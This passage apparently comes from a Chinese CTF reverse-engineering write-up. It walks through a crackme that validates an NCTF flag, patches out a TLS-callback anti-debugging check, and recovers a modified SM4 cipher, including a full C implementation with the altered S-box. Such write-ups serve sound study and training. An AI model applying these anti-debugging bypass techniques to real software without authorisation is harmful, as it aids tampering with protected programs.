&#123;</span><br><span class="line">    sub_7FF6E42D1830(aLengthError);             <span class="comment">// &quot;Length Error!&quot;</span></span><br><span class="line">    ExitProcess(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(</span><br><span class="line">          Str1,</span><br><span class="line">          Str2,                                 <span class="comment">// &quot;NCTF&#123;&quot;</span></span><br><span class="line">          <span class="number">5uLL</span>) &amp;&amp; Str1[<span class="number">37</span>] == <span class="number">125</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF6E42D1E10(Str1, <span class="string">&quot;NCTF&#123;%32s&#125;&quot;</span>, byte_7FF6E42FC380);</span><br><span class="line">    <span class="built_in">memcpy</span>(v4, &amp;aNctf24nctf, <span class="number">0xAu</span>LL);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;v4[<span class="number">10</span>], &amp;aNctf24nctf, <span class="number">6uLL</span>);</span><br><span class="line">    sub_7FF6E42D19D0(byte_7FF6E42FC380, v4, Buf1);</span><br><span class="line">    sub_7FF6E42D19D0(&amp;byte_7FF6E42FC380[<span class="number">16</span>], v4, Buf1_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(Buf1, &amp;Buf2_, <span class="number">0x20u</span>LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF6E42D1830(aWrongFlag);               <span class="comment">// &quot;Wrong Flag!&quot;</span></span><br><span class="line">    ExitProcess(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF6E42D1830(aCorrect);                   <span class="comment">// &quot;Correct!&quot;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目提示说调试器在监视你，果然调试的时候闪退了，往start方向找下断点发现毫无作用，那看来是init或者tls的原因，看导出表发现果然有两个tls，第一个里面看不出是做什么的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_140001520</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_1400011D0() )</span><br><span class="line">    RaiseException(<span class="number">0xE0000001</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺着找很快就看到了，这里把逻辑改一下然后保存一下，就可以调试了，整体逻辑不难，就是sm4加密，当然如果没见过还是很难的，不过直接解密发现有问题，应该是sm4有改动，加密逻辑不好改的话那就只能是1.盒2.轮遍数，后面发现是Sbox变动了，是因为我发现key变了，看交叉引用发现是tls0里面的东西。。。前面说的话打脸了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_7FF677251480</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_7FF67727A0C0[i] ^= <span class="number">0x91u</span>;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">10</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF677251E80(byte_7FF67727A0D0, &amp;byte_7FF67727A0D0[byte_7FF67727A0C0[j]]);</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(j + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面的就是盒，前面的是key，再次解密就出flag了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _SM4_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u8 unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u32 unsigned long</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">four_uCh2uLong</span><span class="params">(u8* in, u32* out)</span>;             <span class="comment">//四字节转换成u32</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">uLong2four_uCh</span><span class="params">(u32 in, u8* out)</span>;              <span class="comment">//u32转换成四字节</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">move</span><span class="params">(u32 data, <span class="type">int</span> length)</span>;          <span class="comment">//左移，保留丢弃位放置尾部</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">func_key</span><span class="params">(u32 input)</span>;                 <span class="comment">//先使用Sbox进行非线性变化，再将线性变换L置换为L&#x27;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">func_data</span><span class="params">(u32 input)</span>;                <span class="comment">//先使用Sbox进行非线性变化，再进行线性变换L</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">(u8* data, <span class="type">int</span> len)</span>;                 <span class="comment">//无符号字符数组转16进制打印</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encode_fun</span><span class="params">(u8 len, u8* key, u8* input, u8* output)</span>;   <span class="comment">//加密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode_fun</span><span class="params">(u8 len, u8* key, u8* input, u8* output)</span>;   <span class="comment">//解密函数</span></span><br><span class="line"><span class="comment">/******************************定义系统参数FK的取值****************************************/</span></span><br><span class="line"><span class="type">const</span> u32 TBL_SYS_PARAMS[<span class="number">4</span>] = &#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0xa3b1bac6</span>,</span><br><span class="line"><span class="number">0x56aa3350</span>,</span><br><span class="line"><span class="number">0x677d9197</span>,</span><br><span class="line"><span class="number">0xb27022dc</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/******************************定义固定参数CK的取值****************************************/</span></span><br><span class="line"><span class="type">const</span> u32 TBL_FIX_PARAMS[<span class="number">32</span>] = &#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0x00070e15</span>,<span class="number">0x1c232a31</span>,<span class="number">0x383f464d</span>,<span class="number">0x545b6269</span>,</span><br><span class="line"><span class="number">0x70777e85</span>,<span class="number">0x8c939aa1</span>,<span class="number">0xa8afb6bd</span>,<span class="number">0xc4cbd2d9</span>,</span><br><span class="line"><span class="number">0xe0e7eef5</span>,<span class="number">0xfc030a11</span>,<span class="number">0x181f262d</span>,<span class="number">0x343b4249</span>,</span><br><span class="line"><span class="number">0x50575e65</span>,<span class="number">0x6c737a81</span>,<span class="number">0x888f969d</span>,<span class="number">0xa4abb2b9</span>,</span><br><span class="line"><span class="number">0xc0c7ced5</span>,<span class="number">0xdce3eaf1</span>,<span class="number">0xf8ff060d</span>,<span class="number">0x141b2229</span>,</span><br><span class="line"><span class="number">0x30373e45</span>,<span class="number">0x4c535a61</span>,<span class="number">0x686f767d</span>,<span class="number">0x848b9299</span>,</span><br><span class="line"><span class="number">0xa0a7aeb5</span>,<span class="number">0xbcc3cad1</span>,<span class="number">0xd8dfe6ed</span>,<span class="number">0xf4fb0209</span>,</span><br><span class="line"><span class="number">0x10171e25</span>,<span class="number">0x2c333a41</span>,<span class="number">0x484f565d</span>,<span class="number">0x646b7279</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/******************************SBox参数列表****************************************/</span></span><br><span class="line"><span class="type">const</span> u8 TBL_SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0xD1</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>,</span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x17</span>, <span class="number">0xA9</span>, <span class="number">0x1C</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>,</span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0x4F</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0xD6</span>, <span class="number">0xA8</span>,</span><br><span class="line"><span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0xFC</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x9F</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0xC9</span>, <span class="number">0x87</span>,</span><br><span class="line"><span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>,</span><br><span class="line"><span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>,</span><br><span class="line"><span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line"><span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>,</span><br><span class="line"><span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>,</span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//4字节无符号数组转无符号long型</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">four_uCh2uLong</span><span class="params">(u8* in, u32* out)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">*out = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">*out = ((u32)in[i] &lt;&lt; (<span class="number">24</span> - i * <span class="number">8</span>)) ^ *out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//无符号long型转4字节无符号数组</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">uLong2four_uCh</span><span class="params">(u32 in, u8* out)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//从32位unsigned long的高位开始取</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">*(out + i) = (u32)(in &gt;&gt; (<span class="number">24</span> - i * <span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//左移，保留丢弃位放置尾部</span></span><br><span class="line">u32 <span class="title function_">move</span><span class="params">(u32 data, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">u32 result = <span class="number">0</span>;</span><br><span class="line">result = (data &lt;&lt; length) ^ (data &gt;&gt; (<span class="number">32</span> - length));</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//秘钥处理函数,先使用Sbox进行非线性变化，再将线性变换L置换为L&#x27;</span></span><br><span class="line">u32 <span class="title function_">func_key</span><span class="params">(u32 input)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">u32 ulTmp = <span class="number">0</span>;</span><br><span class="line">u8 ucIndexList[<span class="number">4</span>] = &#123;</span><br><span class="line"> <span class="number">0</span> &#125;;</span><br><span class="line">u8 ucSboxValueList[<span class="number">4</span>] = &#123;</span><br><span class="line"> <span class="number">0</span> &#125;;</span><br><span class="line">uLong2four_uCh(input, ucIndexList);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];</span><br><span class="line">&#125;</span><br><span class="line">four_uCh2uLong(ucSboxValueList, &amp;ulTmp);</span><br><span class="line">ulTmp = ulTmp ^ move(ulTmp, <span class="number">13</span>) ^ move(ulTmp, <span class="number">23</span>);</span><br><span class="line"><span class="keyword">return</span> ulTmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加解密数据处理函数,先使用Sbox进行非线性变化，再进行线性变换L</span></span><br><span class="line">u32 <span class="title function_">func_data</span><span class="params">(u32 input)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">u32 ulTmp = <span class="number">0</span>;</span><br><span class="line">u8 ucIndexList[<span class="number">4</span>] = &#123;</span><br><span class="line"> <span class="number">0</span> &#125;;</span><br><span class="line">u8 ucSboxValueList[<span class="number">4</span>] = &#123;</span><br><span class="line"> <span class="number">0</span> &#125;;</span><br><span class="line">uLong2four_uCh(input, ucIndexList);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];</span><br><span class="line">&#125;</span><br><span class="line">four_uCh2uLong(ucSboxValueList, &amp;ulTmp);</span><br><span class="line">ulTmp = ulTmp ^ move(ulTmp, <span class="number">2</span>) ^ move(ulTmp, <span class="number">10</span>) ^ move(ulTmp, <span class="number">18</span>) ^ move(ulTmp, <span class="number">24</span>);</span><br><span class="line"><span class="keyword">return</span> ulTmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加密函数（可以加密任意长度数据，16字节为一次循环，不足部分补0凑齐16字节的整数倍）</span></span><br><span class="line"><span class="comment">//len:数据长度(任意长度数据) key:密钥（16字节） input:输入的原始数据 output:加密后输出数据</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encode_fun</span><span class="params">(u8 len, u8* key, u8* input, u8* output)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">u8* p = (u8*)<span class="built_in">malloc</span>(<span class="number">50</span>);      <span class="comment">//定义一个50字节缓存区</span></span><br><span class="line">u32 ulKeyTmpList[<span class="number">4</span>] = &#123;</span><br><span class="line"> <span class="number">0</span> &#125;;   <span class="comment">//存储密钥的u32数据</span></span><br><span class="line">u32 ulKeyList[<span class="number">36</span>] = &#123;</span><br><span class="line"> <span class="number">0</span> &#125;;     <span class="comment">//用于密钥扩展算法与系统参数FK运算后的结果存储</span></span><br><span class="line">u32 ulDataList[<span class="number">36</span>] = &#123;</span><br><span class="line"> <span class="number">0</span> &#125;;    <span class="comment">//用于存放加密数据</span></span><br><span class="line"><span class="comment">/***************************开始生成子秘钥********************************************/</span></span><br><span class="line">four_uCh2uLong(key, &amp;(ulKeyTmpList[<span class="number">0</span>]));</span><br><span class="line">four_uCh2uLong(key + <span class="number">4</span>, &amp;(ulKeyTmpList[<span class="number">1</span>]));</span><br><span class="line">four_uCh2uLong(key + <span class="number">8</span>, &amp;(ulKeyTmpList[<span class="number">2</span>]));</span><br><span class="line">four_uCh2uLong(key + <span class="number">12</span>, &amp;(ulKeyTmpList[<span class="number">3</span>]));</span><br><span class="line">ulKeyList[<span class="number">0</span>] = ulKeyTmpList[<span class="number">0</span>] ^ TBL_SYS_PARAMS[<span class="number">0</span>];</span><br><span class="line">ulKeyList[<span class="number">1</span>] = ulKeyTmpList[<span class="number">1</span>] ^ TBL_SYS_PARAMS[<span class="number">1</span>];</span><br><span class="line">ulKeyList[<span class="number">2</span>] = ulKeyTmpList[<span class="number">2</span>] ^ TBL_SYS_PARAMS[<span class="number">2</span>];</span><br><span class="line">ulKeyList[<span class="number">3</span>] = ulKeyTmpList[<span class="number">3</span>] ^ TBL_SYS_PARAMS[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)             <span class="comment">//32次循环迭代运算</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//5-36为32个子秘钥</span></span><br><span class="line">ulKeyList[i + <span class="number">4</span>] = ulKeyList[i] ^ func_key(ulKeyList[i + <span class="number">1</span>] ^ ulKeyList[i + <span class="number">2</span>] ^ ulKeyList[i + <span class="number">3</span>] ^ TBL_FIX_PARAMS[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***********************************生成32轮32位长子秘钥结束**********************************/</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)        <span class="comment">//将输入数据存放在p缓存区</span></span><br><span class="line">*(p + i) = *(input + i);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span> - len % <span class="number">16</span>; i++)<span class="comment">//将不足16位补0凑齐16的整数倍</span></span><br><span class="line">*(p + len + i) = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len / <span class="number">16</span> + ((len % <span class="number">16</span>) ? <span class="number">1</span> : <span class="number">0</span>); j++)  <span 